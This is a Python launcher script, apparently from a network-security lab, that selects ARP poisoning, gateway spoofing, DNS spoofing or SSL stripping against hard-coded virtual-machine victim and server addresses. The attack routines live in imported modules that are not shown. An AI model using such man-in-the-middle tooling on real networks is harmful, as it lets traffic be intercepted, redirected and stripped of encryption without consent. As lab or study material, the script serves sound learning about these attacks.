import config
import arp_poison
import dns_spoof
import arp_mitm_gateway
import ssl_strip
import sys

def main():
    interface = 'enp0s3'
    interfaceNetwork = 'enp0s8'

    print("Interface: {}".format(interface))

    '''
    macVictim = '08:00:27:CA:16-F1'
    ipVictim = '10.0.2.5'
    macServer = '08:00:27:5A:42:20'
    ipServer = '10.0.2.4'
    macAttacker = '08:00:27:0b:33:f8'
    ipAttacker = '10.0.2.6'
    '''
    macVictim = '08:00:27:B7:C4:AF'
    ipVictim = '192.168.56.101'
    macServer = '08:00:27:CC:08:6F'
    ipServer = '192.168.56.102'
    macAttacker = '08:00:27:D0:25:4B'
    ipAttacker = '192.168.56.103'
    
    ipVictimNetwork = '10.0.2.5' #'10.0.3.10'
    ipGatewayNetwork = '10.0.2.4' #'10.0.3.2'
    ipAttackerNetwork = '10.0.2.6' #'10.0.3.15'
    

    print("Target IP (M1): {}".format(ipVictim))
    print("Target MAC (M1): {}\n".format(macVictim))

    print("Gateway(Server) IP (M2): {}".format(ipServer))
    print("Gateway(Server) MAC (M2): {}\n".format(macServer))

    print("Attacker IP (M3): {}".format(ipAttacker))    
    print("Attacker MAC (M3): {}\n".format(macAttacker))
    

    if len(sys.argv) != 2:
        print("Usage: python main.py [arp|dns|ssl]")
        sys.exit(1)
    if sys.argv[1] == "arp":
        print("ARP Poisoning...")
        arp_poison.arp_poison(ipVictim, macVictim, ipServer, macAttacker, interface)
    elif sys.argv[1] == "arp_patient":
        arp_poison.arp_listener(macAttacker, interface)
    elif sys.argv[1] == "arp_gateway":
        arp_mitm_gateway.gateway_spoof(ipGatewayNetwork, \
                                       ipAttackerNetwork, \
                                        ipVictimNetwork, \
                                        interfaceNetwork)
    elif sys.argv[1] == "dns":
        print("DNS spoofing...")
        dns_spoof.dns_spoof()
    elif sys.argv[1] == "ssl":
        print("SSL stripping...")
        ssl_strip.ssl_strip(interface) # pass in interface or network interface?
    else:
        print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
        sys.exit(1)

if __name__ == "__main__":
    main()
